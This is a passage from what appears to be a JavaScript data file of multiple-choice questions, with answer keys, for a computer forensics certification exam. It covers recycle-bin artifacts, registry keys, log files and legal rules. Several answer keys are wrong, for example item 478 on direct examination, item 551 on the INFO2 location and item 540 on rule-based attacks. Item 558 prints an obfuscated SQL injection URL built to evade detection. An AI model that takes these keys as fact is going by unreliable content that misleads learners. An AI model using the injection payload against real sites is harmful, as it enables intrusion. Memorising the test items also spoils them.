      "Network-platform correlation",
      "Cross-platform correlation",
      "Multiple-platform correlation",
    ],
    correctAnswer: 2,
  },
  {
    id: 462,
    question:
      "What malware analysis operation can the investigator perform using the jv16 tool?",
    options: [
      "Files and Folder Monitor",
      "Installation Monitor",
      "Network Traffic Monitoring/Analysis",
      "Registry Analysis/Monitoring",
    ],
    correctAnswer: 3,
  },
  {
    id: 463,
    question:
      "A Linux system is undergoing investigation. In which directory should the investigators look for its current state data if the system is in powered on state?",
    options: ["/auth", "/proc", "/var/log/debug", "/var/spool/cron/"],
    correctAnswer: 1,
  },
  {
    id: 464,
    question:
      "Derrick, a forensic specialist, was investigating an active computer that was executing various processes. Derrick wanted to check whether this system was used in an incident that occurred earlier. He started inspecting and gathering the contents of RAM, cache, and DLLs to identify incident signatures. Identify the data acquisition method employed by Derrick in the above scenario.",
    options: [
      "Live data acquisition",
      "Static data acquisition",
      "Dead data acquisition",
      "Non-volatile data acquisition",
    ],
    correctAnswer: 0,
  },
  {
    id: 465,
    question:
      "What happens to the header of the file once it is deleted from the Windows OS file systems?",
    options: [
      "The OS replaces the entire hex byte coding of the file.",
      "The OS replaces the second letter of a deleted file name with a hex byte code: Eh5",
      "The OS replaces the first letter of a deleted file name with a hex byte code: E5h",
      "The hex byte coding of the file remains the same, but the file location differs",
    ],
    correctAnswer: 2,
  },
  {
    id: 466,
    question:
      "Steve received a mail that seemed to have come from her bank. The mail has instructions for Steve to click on a link and provide information to avoid the suspension of her account. The link in the mail redirected her to a form asking for details such as name, phone number, date of birth, credit card number or PIN, CVV code, SNNs, and email address. On a closer look, Steve realized that the URL of the form in not the same as that of her bank's. Identify the type of external attack performed by the attacker in the above scenario?",
    options: ["Tailgating", "Espionage", "Phishing", "Brute-force"],
    correctAnswer: 2,
  },
  {
    id: 467,
    question:
      "Identify the location of Recycle Bin on a Windows 7 machine that uses NTFS file system to store and retrieve files on the hard disk.",
    options: [
      "Drive:\\RECYCLER",
      "Drive:\\RECYCLED",
      "C:\\RECYCLED",
      "Drive:\\$Recycle.Bin",
    ],
    correctAnswer: 3,
  },
  {
    id: 468,
    question:
      "In a Filesystem Hierarchy Standard (FHS), which of the following directories contains the binary files required for working?",
    options: ["/mnt", "/media", "/sbin", "/proc"],
    correctAnswer: 2,
  },
  {
    id: 469,
    question:
      "James, a forensics specialist, was tasked with investigating a Windows XP machine that was used for malicious online activities. During the investigation, he recovered certain deleted files from Recycle Bin to identify attack clues. Identify the location of Recycle Bin in Windows XP system.",
    options: [
      "Drive:\\$Recycle.Bin\\",
      "Local/share/Trash",
      "Drive:\\RECYCLER\\",
      "Drive:\\RECYCLED",
    ],
    correctAnswer: 2,
  },
  {
    id: 472,
    question:
      "Which code does the FAT file system use to mark the file as deleted?",
    options: ["ESH", "H5E", "E5H", "5EH"],
    correctAnswer: 2,
  },
  {
    id: 473,
    question:
      "What is the investigator trying to view by issuing the command displayed in the following screenshot?",
    options: [
      "List of services stopped",
      "List of services closed recently",
      "List of services recently started",
      "List of services installed",
    ],
    correctAnswer: 3,
  },
  {
    id: 474,
    question:
      "While analyzing a hard disk, the investigator finds that the file system does not use UEFI-based interface. Which of the following operating systems is present on the hard disk?",
    options: ["Windows 8", "Windows 7", "Windows 8.1", "Windows 10"],
    correctAnswer: 1,
  },
  {
    id: 475,
    question:
      "Which of the following tools can be used to parse the contents of .lnk files to reveal information embedded within the files?",
    options: ["Windows File Analyzer", "ProDiscover", "Exiv2", "InfraView"],
    correctAnswer: 0,
  },
  {
    id: 476,
    question:
      "Which of the following is found within the unique instance ID key and helps investigators to map the entry from USBSTOR key to the MountedDevices key?",
    options: ["ParentIDPrefix", "LastWrite", "UserAssist key", "MRUListEx key"],
    correctAnswer: 0,
  },
  {
    id: 477,
    question:
      "Which event correlation approach is used to monitor the computer’s and computer users’ behavior to provide an alert if something anomalous is found?",
    options: [
      "Automated Field Correlation",
      "Field-Based Approach",
      "Role-Based Approach",
      "Vulnerability-Based Approach",
    ],
    correctAnswer: 2,
  },
  {
    id: 478,
    question:
      "Which of the following examinations refers to the process of the witness being questioned by the attorney who called the letter to the stand?",
    options: [
      "Witness Examination",
      "Direct Examination",
      "Cross Examination",
      "Indirect Examination",
    ],
    correctAnswer: 0,
  },
  {
    id: 479,
    question:
      "Which of the following SQL query can a forensic investigator use to retrieve the active Transaction Log files for a specific database?",
    options: ["DBCC LOG", "DBCC DBINFO", "DBCC DATABLE", "DBCC DBLOG"],
    correctAnswer: 3,
  },
  {
    id: 480,
    question:
      "In which attack does an attacker place a virtual machine (VM) in proximity to target cloud server, and take advantage of shared physical resources (processor cache) to extract cryptographic keys/plain text secrets to steal the victim’s credentials?",
    options: [
      "Cloud Hijacking Attack",
      "Spoofing Attack",
      "Wrapping Attack",
      "Side channel Attacks",
    ],
    correctAnswer: 3,
  },
  {
    id: 481,
    question:
      "Tasklist command displays a list of applications and services with their Process ID (PID) for all tasks running on either a local or a remote computer. Which of the following tasklist commands provides information about the listed processes, including the image name, PID, name, and number of the session for the process?",
    options: ["tasklist /p", "tasklist /v", "tasklist /u", "tasklist /s"],
    correctAnswer: 1,
  },
  {
    id: 482,
    question:
      "Which of the following examinations refers to the process of providing the opposing side in a trial the opportunity to question a witness?",
    options: [
      "Indirect Examination",
      "Cross Examination",
      "Witness Examination",
      "Direct Examination",
    ],
    correctAnswer: 1,
  },
  {
    id: 483,
    question:
      'On a Linux system, what is the command "dcfldd if=/dev/sda of=usbimg.dat” used for?',
    options: [
      "To acquire an entire media device in one dat file",
      "To acquire an entire media device in one image file",
      "To make an ISO image of a CD",
      "To generate segmented volumes of equal size",
    ],
    correctAnswer: 0,
  },
  {
    id: 484,
    question:
      "NTFS sets a flag for the file once you encrypt it and creates an EFS attribute where it stores Data Decryption Field (DDF) and Data Recovery Field (DDR). Which of the following is not a part of DDF?",
    options: [
      "Encrypted FEK",
      "Checksum",
      "EFS Certificate Hash",
      "Container Name",
    ],
    correctAnswer: 1,
  },
  {
    id: 485,
    question:
      "NTFS has reduced slack space than FAT, thus having lesser potential to hide data in the slack space. This is because:",
    options: [
      "FAT does not index files",
      "NTFS is a journaling file system",
      "NTFS has lower cluster size space",
      "FAT is an older and inefficient file system",
    ],
    correctAnswer: 2,
  },
  {
    id: 486,
    question:
      "What is the framework used for application development for iOS-based mobile devices?",
    options: ["Cocoa Touch", "Dalvik", "Zygote", "AirPlay"],
    correctAnswer: 0,
  },
  {
    id: 487,
    question:
      "Which of the following application password cracking tool can discover all password-protected items on a computer and decrypts them?",
    options: [
      "TestDisk for Windows",
      "R-Studio",
      "Windows Password Recovery Bootdisk",
      "Passware Kit Forensic",
    ],
    correctAnswer: 3,
  },
  {
    id: 488,
    question:
      "By examining which registry location in the Gilchrist’s system did Robert prove that the hacker has been connected to the XYZ wireless network?",
    options: [
      "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\NetworkList\\Profiles",
      "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\TypedURLs",
      "HKEY_CURRENT_MACHINE\\System\\Services\\CurrentControlSet\\services\\Tcpip\\Parameters\\Interfaces",
      "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs",
    ],
    correctAnswer: 0,
  },
  {
    id: 489,
    question:
      "Shane has started the static analysis of a malware and is using the tool ResourcesExtract to find more details of the malicious program. What part of the analysis is he performing?",
    options: [
      "Identifying File Dependencies",
      "Strings search",
      "Dynamic analysis",
      "File obfuscation",
    ],
    correctAnswer: 1,
  },
  {
    id: 490,
    question:
      "The Run rd /s /q C:\\$Recycle.bin command is executed on a Windows machine to.",
    options: [
      "Disable the Recycle Bin",
      "Repair the Recycle Bin",
      "Empty the Recycle Bin",
      "Restore the files deleted from the Recycle Bin",
    ],
    correctAnswer: 2,
  },
  {
    id: 491,
    question:
      'Shane a forensic specialist, is investigating an ongoing attack on a MySQL database server hosted on a Windows machine with SID "WIN-ABCDE12345F." What log will help Shane in tracking all the client connections and activities performed on database server?',
    options: [
      "WIN-ABCDoE12345F-bin.n",
      "WIN-ABCDE12345F.log",
      "WIN-ABCDE12345F.err",
      "WIN-ABCDE12345F.pid",
    ],
    correctAnswer: 1,
  },
  {
    id: 492,
    question:
      "What must an attorney do first before you are called to testify as an expert?",
    options: [
      "Qualify you as an expert witness.",
      "Read your curriculum vitae to the jury.",
      "Engage in damage control.",
      "Prove that the tools you used to conduct your examination are perfect.",
    ],
    correctAnswer: 0,
  },
  {
    id: 493,
    question:
      "Raw data acquisition format creates ____________of a data set or suspect drive.",
    options: [
      "Simple sequential flat files.",
      "Segmented files.",
      "Compressed image files.",
      "Segmented image files.",
    ],
    correctAnswer: 0,
  },
  {
    id: 494,
    question: "Which of the following is a part of a Solid-State Drive (SSD)?",
    options: ["NAND-based flash memory", "Head", "Spindle", "Cylinder"],
    correctAnswer: 0,
  },
  {
    id: 495,
    question:
      "Which of the following files gives information about the client sync sessions in Google Drive on Windows?",
    options: ["sync_log.log", "Sync_log.log", "sync.log", "Sync.log"],
    correctAnswer: 1,
  },
  {
    id: 496,
    question: "Which of the following will create lost clusters?",
    options: [
      "Logical structure error",
      "Physical structure error",
      "Physical disk error",
      "Logical disk error",
    ],
    correctAnswer: 0,
  },
  {
    id: 497,
    question:
      "Dan, a hacker, built an attractive website that has buttons and images containing text on each of them saying 'Click here to win an iPhone, Facebook a free trip to New York', and so on. Over these buttons, Dan loads an iframe in such a way that when a user clicks on any of those buttons or images, malware will be downloaded in their systems. What type of attack is Dan attempting in this scenario?",
    options: ["Clickjacking", "IRCs", "Likejacking", "Spearphishing"],
    correctAnswer: 0,
  },
  {
    id: 498,
    question:
      "Which of the following is a precomputed table containing word lists like dictionary files and brute force lists and their hash values?",
    options: [
      "Directory Table",
      "Rainbow Table",
      "Master file Table (MFT)",
      "Partition Table",
    ],
    correctAnswer: 1,
  },
  {
    id: 499,
    question:
      "Which of the following does not describe the type of data density on a hard disk?",
    options: [
      "Volume density",
      "Track density",
      "Linear or recording density",
      "Areal density",
    ],
    correctAnswer: 0,
  },
  {
    id: 500,
    question:
      "During forensics investigations, investigators tend to collect the system time at first and compare it with UTC. What does the abbreviation UTC stand for?",
    options: [
      "Correlated Universal Time",
      "Universal Time for Computers",
      "Coordinated Universal Time",
      "Universal Computer Time",
    ],
    correctAnswer: 2,
  },
  {
    id: 501,
    question:
      "Adam, a forensic analyst, is preparing VMs for analyzing malware. Which of the following is NOT a best practice?",
    options: [
      "Installing malware analysis tools",
      "Using network simulation tools",
      "Isolating the host device",
      "Enabling shared folders",
    ],
    correctAnswer: 3,
  },
  {
    id: 502,
    question: "What is the role of Alloc.c in Apache core?",
    options: [
      "It handles allocation of resource pools",
      "It is useful for reading and handling of the configuration files",
      "It takes care of all the data exchange and socket connections between the client and the server",
      "It handles server start-ups and timeouts",
    ],
    correctAnswer: 0,
  },
  {
    id: 503,
    question:
      "In which of the following attackers does an attacker duplicate the body of the SOAP message and send it to the server impersonating a legitimate user, thereby accessing the cloud resources as the legitimate user?",
    options: [
      "Meltdown Attack",
      "Cloud Squatting",
      "Side Channel Attack",
      "Wrapping Attack",
    ],
    correctAnswer: 3,
  },
  {
    id: 504,
    question:
      "You are asked to perform forensics on a MAC operating system. What kind of information would you obtain when you issue the stat command, followed by its supporting switches in the MAC terminal?",
    options: [
      "Timestamp information of the selected file",
      "Processes running on the system",
      "System version information",
      "Statistics of the present working directory",
    ],
    correctAnswer: 0,
  },
  {
    id: 505,
    question:
      "Which of the following reports are delivered under oath to a board of directors/managers/panel of the jury?",
    options: [
      "Verbal Formal Report",
      "Written Formal Report",
      "Written Informal Report",
      "Verbal Informal Report",
    ],
    correctAnswer: 0,
  },
  {
    id: 506,
    question:
      "Which Federal rule of evidence states that a duplicate is admissible to the same extent as an original unless (1) a genuine question is raised as to the authenticity of the original or (2) in the circumstances it would be unfair to admit the duplicate in lieu of the original?",
    options: ["Rule 804", "Rule 1003", "Rule 1000", "Rule 1004"],
    correctAnswer: 1,
  },
  {
    id: 507,
    question:
      "Which of the following email headers specifies an address for mailer-generated errors, like 'no such user' bounce messages, to go to (instead of the sender's address)?",
    options: [
      "Mime-Version header",
      "Content-Type header",
      "Content-Transfer-Encoding header",
      "Errors-To header",
    ],
    correctAnswer: 3,
  },
  {
    id: 508,
    question: "Identify the RAID level represented below:",
    options: ["RAID 3", "RAID 5", "RAID 2", "RAID 0"],
    correctAnswer: 1,
  },
  {
    id: 509,
    question:
      "Which of the following attack uses HTML tag like <script></script>?",
    options: ["Phishing", "Spam", "XSS attack", "SQL injection"],
    correctAnswer: 2,
  },
  {
    id: 510,
    question:
      "Select the tool appropriate for examining the dynamically linked libraries of an application or malware.",
    options: ["DependencyWalker", "ResourcesExtract", "SysAnalyzer", "PEiD"],
    correctAnswer: 0,
  },
  {
    id: 511,
    question:
      "Which of the following functions of a log management system involves calculation of the message digest for each file and storing the message digest securely to ensure detection of the changes made to the archived logs?",
    options: [
      "Log comparison",
      "Log file integrity checking",
      "Log normalization",
      "Log parsing",
    ],
    correctAnswer: 1,
  },
  {
    id: 512,
    question:
      "After suspecting a change in MS-Exchange Server storage archive, the investigator has analyzed it. Which of the following components is not an actual part of the archive?",
    options: ["PUB.STM", "PRIV.EDB", "PRIV.STM", "PUB.EDB"],
    correctAnswer: 0,
  },
  {
    id: 513,
    question: "What is the default IIS log location?",
    options: [
      "%SystemDrive%\\inetpub\\logs\\LogFiles",
      "SystemDrive\\inetpub\\LogFiles",
      "SystemDrive\\logs\\LogFiles",
      "%SystemDrive%\\logs\\LogFiles",
    ],
    correctAnswer: 0,
  },
  {
    id: 514,
    question:
      "Which file system developed by Apple, Inc., uses Unicode to name the files and folders within the system?",
    options: [
      "Extended File System (EXT2)",
      "Hierarchical File System (FHS)",
      "File Allocation Table (FAT)",
      "Hierarchical File System Plus (HFS+)",
    ],
    correctAnswer: 3,
  },
  {
    id: 515,
    question:
      "In a centralized logging mechanism, what is the purpose of a local SEM server?",
    options: [
      "The local SEM server processes all the event and forwards/deletes unnecessary events",
      "The local SEM simply forwards all the logs to the master SEM",
      "The local SEM server collects, processes, and queues all the events and forwards further tasks to the master SEM server",
      "The local SEM server executes the subsequent functions of processing and storing the security events for analysis, reporting and display",
    ],
    correctAnswer: 2,
  },
  {
    id: 516,
    question:
      "What is the investigator trying to analyze if the system gives the following image as output?",
    options: [
      "All the logon sessions",
      "Currently active logon sessions",
      "Inactive logon sessions",
      "Details of users who can logon",
    ],
    correctAnswer: 1,
  },
  {
    id: 517,
    question:
      "Which of the following is a federal law enacted in the US to control the ways that financial institutions deal with the private information of individuals?",
    options: ["GLBA", "PCI DSS", "HIPPA 1996", "SOX"],
    correctAnswer: 0,
  },
  {
    id: 518,
    question:
      "Which of the following is the record of the characteristics of a file system, including its size, the block size, the empty and the filled blocks and their respective counts, the size and location of the inode tables, the disk block map and usage information, and the size of the block groups?",
    options: [
      "Inode bitmap block",
      "Block bitmap block",
      "Data block",
      "Superblock",
    ],
    correctAnswer: 3,
  },
  {
    id: 519,
    question:
      "What system details can an investigator obtain from the NetBIOS name table cache?",
    options: [
      "List of files shared between the connected systems",
      "List of connections made to other systems",
      "List of files opened on other systems",
      "List of the system present on a router",
    ],
    correctAnswer: 1,
  },
  {
    id: 520,
    question:
      "Steve, a system engineer in an organization, is facing allegations of uploading child pornography videos from his office computer. What type of investigation should be carried against him?",
    options: [
      "Criminal investigation",
      "Both Criminal and Administrative Investigation",
      "Civil Investigation",
      "Administrative Investigation",
    ],
    correctAnswer: 3,
  },
  {
    id: 521,
    question:
      "Joshua is analyzing an MSSQL database for finding the attack evidence and other details, where should he look for the database logs?",
    options: ["Model.log", "Model.txt", "Model.ldf", "Model.lgf"],
    correctAnswer: 2,
  },
  {
    id: 522,
    question:
      "Which among the following search warrants allows the first responder to get the victim's computer information such as service records, billing records, and subscriber information from the service provider?",
    options: [
      "Citizen Information Search Warrant",
      "Electronic Storage Device Search Warrant",
      "Service Provider Search Warrant",
      "John Doe Search Warrant",
    ],
    correctAnswer: 2,
  },
  {
    id: 523,
    question:
      "Which among the following is an OLE compound file saved in Binary Interchange File Format (BIFF)?",
    options: ["PNG", "GIF", "XLS", "PDF"],
    correctAnswer: 2,
  },
  {
    id: 524,
    question:
      "Robert was arrested under child pornography case for uploading child pornography videos to a website. FBI seized all the digital devices pertaining to the case and a forensic investigator was hired to carry out the investigation. The investigator suspected that the perpetrator might have performed the task online through the web browser. He also found that the suspect’s web browser history was cleared, which drew a better insight into the case. To recover the deleted browser artifacts and the Internet history from the web browser, which of the following tools is used by the forensic investigator?",
    options: ["MultiMon", "LogMeister", "Proc Heal Viewer", "HstEx"],
    correctAnswer: 1,
  },
  {
    id: 525,
    question:
      "Which network attack is described by the following statement? 'At least five Russian major banks came under a continuous hacker attack, although online client services were not disrupted. The attack came from a wide-scale botnet involving at least 24,000 computers, located in 30 countries.'",
    options: [
      "Man-in-the-Middle Attack",
      "Sniffer Attack",
      "Buffer Overflow",
      "DDoS",
    ],
    correctAnswer: 3,
  },
  {
    id: 526,
    question:
      "Jason discovered a file named $RIYG6VR.doc in the C:\\$Recycle.Bin\\<USER SID>\\ while analyzing a hard disk image for the deleted data. What inferences can he make from the file name?",
    options: [
      "It is a doc file deleted in seventh sequential order",
      "RIYG6VR.doc is the name of the doc file deleted from the system",
      "It is file deleted from R drive",
      "It is a deleted doc file",
    ],
    correctAnswer: 3,
  },
  {
    id: 527,
    question:
      "The surface of a hard disk consists of several concentric rings known as tracks; each of these tracks has smaller partitions called disk blocks. What is the size of each block?",
    options: ["512 bits", "512 bytes", "256 bits", "256 bytes"],
    correctAnswer: 1,
  },
  {
    id: 528,
    question:
      "An insider in an organization deleted all the files containing sensitive information from his Windows 7 machine on the last day of his work at the organization. These deleted files would be stored in the Recycle Bin. But, to make them untraceable, he even deleted the INFO2 file from its location, which means that no files would appear in the Recycle Bin. Now, as a forensic expert, what would you do to get the deleted files back to the Recycle Bin?",
    options: [
      "Type attrib -s -h recycler command in the command prompt",
      "Type attrib -h info* command in the command prompt",
      "Restart the Windows machine",
      "Download the file from Microsoft website",
    ],
    correctAnswer: 0,
  },
  {
    id: 529,
    question:
      "In which registry does the system store the Microsoft security IDs?",
    options: [
      "HKEY_CLASSES_ROOT (HKCR)",
      "HKEY_CURRENT_CONFIG (HKCC)",
      "HKEY_CURRENT_USER (HKCU)",
      "HKEY_LOCAL_MACHINE (HKLM)",
    ],
    correctAnswer: 3,
  },
  {
    id: 530,
    question:
      "What is the primary function of the tool CHKDSK in Windows that authenticates the file system reliability of a volume?",
    options: [
      "Repairs logical file system errors",
      "Check the disk for hardware errors",
      "Check the disk for connectivity errors",
      "Check the disk for Slack Space",
    ],
    correctAnswer: 0,
  },
  {
    id: 531,
    question:
      "A forensic examiner is examining a Windows system seized from a crime scene. During the examination of a suspect file, he discovered that the file is password protected. He tried guessing the password using the suspect's available information but without any success. Which of the following tool can help the investigator to solve this issue?",
    options: ["Cain & Abel", "Xplico", "Colasoft’s Capsa", "Recuva"],
    correctAnswer: 0,
  },
  {
    id: 532,
    question:
      "Which file is a sequence of bytes organized into blocks understandable by the system's linker?",
    options: ["executable file", "source file", "Object file", "None of these"],
    correctAnswer: 2,
  },
  {
    id: 533,
    question:
      "As a part of the investigation, Caroline, a forensic expert, was assigned the task to examine the transaction logs pertaining to a database named Transfers. She used SQL Server Management Studio to collect the active transaction log files of the database. Caroline wants to extract detailed information on the logs, including AllocUnitId, page id, slot id, etc. Which of the following commands does she need to execute in order to extract the desired information?",
    options: [
      "DBCC LOG(Transfers, 1)",
      "DBCC LOG(Transfers, 3)",
      "DBCC LOG(Transfers, 0)",
      "DBCC LOG(Transfers, 2)",
    ],
    correctAnswer: 3,
  },
  {
    id: 534,
    question:
      "During the trial, an investigator observes that one of the principal witnesses is severely ill and cannot be present for the hearing. He decides to record the evidence and present it to the court. Under which rule should he present such evidence?",
    options: [
      "Rule 1003: Admissibility of Duplicates",
      "Limited admissibility",
      "Locard's Principle",
      "Hearsay",
    ],
    correctAnswer: 0,
  },
  {
    id: 535,
    question:
      "Which among the following U.S. laws requires financial institutions companies that offer consumers financial products or services such as loans, financial or investment advice, or insurance to protect their customers information against security threats?",
    options: ["FISMA", "HIPPA", "SOX", "GLBA"],
    correctAnswer: 3,
  },
  {
    id: 536,
    question:
      "Which command line tools is used to determine active network connections?",
    options: ["Netstat", "nbstat", "nslookup", "netsh"],
    correctAnswer: 0,
  },
  {
    id: 537,
    question:
      "Which of the following tool can the investigator use to analyze the network to detect Trojan activities?",
    options: ["Regshot", "TRIPWIRE", "RAM Computer", "Capsa"],
    correctAnswer: 3,
  },
  {
    id: 538,
    question:
      "Which of the following processes is part of the dynamic malware analysis?",
    options: [
      "Searching for the strings",
      "Malware disassembly",
      "File fingerprinting",
      "Process Monitoring",
    ],
    correctAnswer: 3,
  },
  {
    id: 539,
    question: "Which of the following is NOT a physical evidence?",
    options: [
      "Cables",
      "Image file on a hard disk",
      "Removable media",
      "Publications",
    ],
    correctAnswer: 1,
  },
  {
    id: 540,
    question:
      "Which password cracking technique uses details such as length of password, character sets used to construct the password, etc.?",
    options: [
      "Dictionary attack",
      "Brute force attack",
      "Rule-based attack",
      "Man in the middle attack",
    ],
    correctAnswer: 0,
  },
  {
    id: 541,
    question:
      "Which of the following tool can reverse machine code to assembly language?",
    options: ["PEiD", "Deep Log Analyzer", "IDA Pro", "RAM Capturer"],
    correctAnswer: 2,
  },
  {
    id: 542,
    question:
      "Which of the following techniques can be used to beat steganography?",
    options: ["Encryption", "Decryption", "Steganalysis", "Cryptanalysis"],
    correctAnswer: 2,
  },
  {
    id: 543,
    question:
      "Files stored in the Recycle Bin in its physical location are renamed as Dxy.ext, where `x` represents the ___________________.",
    options: [
      "Sequential number",
      "Original file name’s extension",
      "Original file name",
      "Drive name",
    ],
    correctAnswer: 3,
  },
  {
    id: 544,
    question:
      "Select the data that a virtual memory would store in a Windows-based system.",
    options: [
      "Running processes",
      "Documents and other files",
      "Application data",
      "Information or metadata of the files",
    ],
    correctAnswer: 0,
  },
  {
    id: 545,
    question:
      "Investigators can use the Type Allocation Code (TAC) to find the model and origin of a mobile device. Where is TAC located in mobile devices?",
    options: [
      "International Mobile Equipment Identifier (IMEI)",
      "Integrated circuit card identifier (ICCID)",
      "International mobile subscriber identity (IMSI)",
      "Equipment Identity Register (EIR)",
    ],
    correctAnswer: 0,
  },
  {
    id: 546,
    question:
      "Which of the following Data files store log-related information that could be useful in recovering databases?",
    options: [
      "Virtual Log Files",
      "Transaction Log Data Files (LDF)",
      "Secondary Log Files (NLF)",
      "Primary Log Files (MLF)",
    ],
    correctAnswer: 1,
  },
  {
    id: 547,
    question:
      "iPhone OS stack consists of four abstraction layers. Which layer among these provides frameworks for iPhone app development?",
    options: ["Media Services", "Cocoa Touch", "Core OS", "Core Services"],
    correctAnswer: 1,
  },
  {
    id: 548,
    question:
      "Analyze the hex representation of mysql-bin.000013 file in the screenshot below. What do you infer from the hex data?",
    options: [
      "A user with username bad_guy has logged into the WordPress web application",
      "An attacker with name anonymous_hacker has replaced a user bad_guy in the WordPress database",
      "A WordPress user has been created with the username anonymous_attacker",
      "A WordPress user has been created with the username bad_guy",
    ],
    correctAnswer: 3,
  },
  {
    id: 549,
    question:
      "A US-based organization decided to implement a RAID storage technology for their data backup plan. John wants to setup a RAID level that requires a minimum of six drives but will meet high fault tolerance and with a high speed for the data read and write operations. What RAID level will John need to choose to meet this requirement?",
    options: ["RAID level 50", "RAID level 1", "RAID level 10", "RAID level 5"],
    correctAnswer: 0,
  },
  {
    id: 550,
    question:
      "What does the bytes 0x0B-0x53 represent in the boot sector of NTFS volume on Windows 2000?",
    options: [
      "Jump instruction and the OEM ID",
      "BIOS Parameter Block (BPB) and the OEM ID",
      "BIOS Parameter Block (BPB) and the extended BPB",
      "Bootstrap code and the end of the sector marker",
    ],
    correctAnswer: 2,
  },
  {
    id: 551,
    question:
      "What is the location of master database file INFO2 containing information about the deleted files in Windows systems prior to Windows Vista?",
    options: [
      "C:\\Recycle\\",
      "C:\\Recycler\\",
      "C:\\Recycled\\",
      "C:\\$Recycle.Bin\\",
    ],
    correctAnswer: 3,
  },
  {
    id: 552,
    question:
      "Which of the following tools will help you to recover deleted files in Mac OS X?",
    options: ["Time Machine", "Spotlight", "Automator", "Grapher"],
    correctAnswer: 0,
  },
  {
    id: 553,
    question:
      "What is the purpose of command “dd if=mbr.backup of=/dev/xxx bs=512 count=1” on a Unix/Linux system?",
    options: ["Back-up BIOS", "Restore the MBR", "Restore BIOS", "Back-up MBR"],
    correctAnswer: 1,
  },
  {
    id: 554,
    question:
      "Common Apache log format is %h%I%u%t\\”%>s%b. What does %b represent in the log format?",
    options: [
      "The status code that the server sends back to the client",
      "The client’s IP address",
      "The size of the object that server sends to the client",
      "The remote log name",
    ],
    correctAnswer: 2,
  },
  {
    id: 555,
    question:
      "Buffer overflow vulnerability of a web application occurs when it fails to guard its buffer properly and allows writing beyond its maximum size. Thus, it overwrites the_________. There are multiple forms of buffer overflow, including a Heap Buffer Overflow and a Format String Attack.",
    options: [
      "Adjacent memory locations",
      "Adjacent bit blocks",
      "Adjacent buffer locations",
      "Adjacent string locations",
    ],
    correctAnswer: 0,
  },
  {
    id: 556,
    question:
      "Which program uses different techniques to conceal a malware's code, thereby making it difficult for security mechanisms to detect or remove it?",
    options: ["Dropper", "Packer", "Injector", "Obfuscator"],
    correctAnswer: 3,
  },
  {
    id: 557,
    question:
      "Brian needs to acquire data from RAID storage. Which of the following acquisition methods is recommended to retrieve only the data relevant to the investigation?",
    options: [
      "Static Acquisition",
      "Sparse or Logical Acquisition",
      "Bit-stream disk-to-disk Acquisition",
      "Bit-by-bit Acquisition",
    ],
    correctAnswer: 1,
  },
  {
    id: 558,
    question:
      "Attackers exploit web applications using techniques, such as SQL injection. To avoid getting detected by the application firewall and IDS/IPS systems, attackers use various obfuscation techniques to bypass the security mechanisms. One such technique has been implemented in the URL given below. What is the technique implemented?\nhttps://www.websitename.com/accounts.php?id=1+UnIoN/**/SeLecT/**/1,2,3--",
    options: [
      "Replaced Keywords",
      "Char Encoding",
      "Toggle Case",
      "Hex Encoding",
    ],
    correctAnswer: 2,
  },
  {
    id: 559,
    question:
      "Which command line tool is used to detect network interfaces that are running in promiscuous mode?",
    options: ["NET SESSIONS", "Promdetect", "Promqry", "Promquery"],
    correctAnswer: 2,
  },
  {
    id: 560,
    question:
      "Which of the following is a list of recently used programs or opened files?",
    options: [
      "GUID Partition Table (GPT)",
      "Recently Used Programs (RUP)",
      "Most Recently Used (MRU)",
      "Master File Table (MFT)",
    ],
    correctAnswer: 2,
  },
  {
    id: 561,
    question:
      "Which block of the ICCID number on a SIM card represents the country code?",
    options: ["Block C", "Block A", "Block D", "Block B"],
    correctAnswer: 3,
  },
  {
    id: 562,
    question:
      "Which of these documents will help an investigator to determine the details of personnel responsible for evidence handling?",
    options: [
      "Search Warrant",
      "Case Assessment Form",
      "Consent Search Form",
      "Chain of Custody",
    ],
    correctAnswer: 3,
  },
  {
    id: 563,
    question:
      "How will you categorize a cybercrime that took place within a CSP's cloud environment?",
    options: [
      "Cloud as a Subject",
      "Cloud as a Tool",
      "Cloud as an Audit",
      "Cloud as an Object",
    ],
    correctAnswer: 3,
  },
  {
    id: 564,
    question:
      "Randy has extracted data from an old version of a Windows-based system and discovered info file Dc5.txt in the system recycle bin. What does the file name denote?",
    options: [
      "A text file deleted from C drive in sixth sequential order",
      "A text file deleted from C drive in fifth sequential order",
      "A text file copied from D drive to C drive in fifth sequential order",
      "A text file copied from C drive to D drive in fifth sequential order",
    ],
    correctAnswer: 1,
  },
  {
    id: 565,
    question:
      "Which of the following laws/rules of the USA deal with fraud and related activity in connection with computers?",
    options: ["Rule 1002", "Rule 1003", "18 USC 1029", "18 USC 1030"],
    correctAnswer: 3,
  },
  {
    id: 566,
    question: "CAN-SPAM act requires that you:",
    options: [
      "Don’t use true header information",
      "Don’t tell the recipients where you are located",
      "Don’t use deceptive subject lines",
      "Don’t identify the message as an ad",
    ],
    correctAnswer: 2,
  },
  {
    id: 567,
    question:
      "Identify the log management function in which each log data field is converted to a particular data representation and categorized consistently.",
    options: [
      "Log conversion",
      "Log normalization",
      "Log viewing",
      "Event correlation",
    ],
    correctAnswer: 1,
  },
  {
    id: 568,
    question:
      "In the registry editor, the registry tree HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\ contains information about each service on the machine. When you select a service, what should the value of Start key specific to that service, if the service starts up automatically?",
    options: ["3", "4", "2", "1"],
    correctAnswer: 2,
  },
  {
    id: 569,
    question:
      "Which MySQL log file contains information on a server start and stop?",
    options: [
      "Binary log",
      "General query log file",
      "Error log file",
      "Slow query log file",
    ],
    correctAnswer: 2,
  },
  {
    id: 570,
    question:
      "Which of the following Perl scripts will help an investigator to access the executable image of a process?",
    options: ["Lpsi.pl", "Lspm.pl", "Lspd.pl", "Lspi.pl"],
    correctAnswer: 3,
  },
  {
    id: 571,
    question:
      "Which of the following commands can be used by the forensic investigators to determine the details of open shared files on a server?",
    options: ["openfiles", "net file", "psfile", "net sessions"],
    correctAnswer: 1,
  },
  {
    id: 572,
    question:
      "Madison is on trial for allegedly breaking into her university's internal network. The police raided her dorm room and seized all of her computer equipment. Madison's lawyer is trying to convince the judge that the seizure was unfounded and baseless. Under which US Amendment is Madison's lawyer trying to prove the police violated?",
    options: [
      "The 4th Amendment",
      "The 1st Amendment",
      "The 10th Amendment",
      "The 5th Amendment",
    ],
    correctAnswer: 0,
  },
  {
    id: 573,
    question:
      "Which block in ext2 file system stores information about the size and shape of the Ext2 file system?",
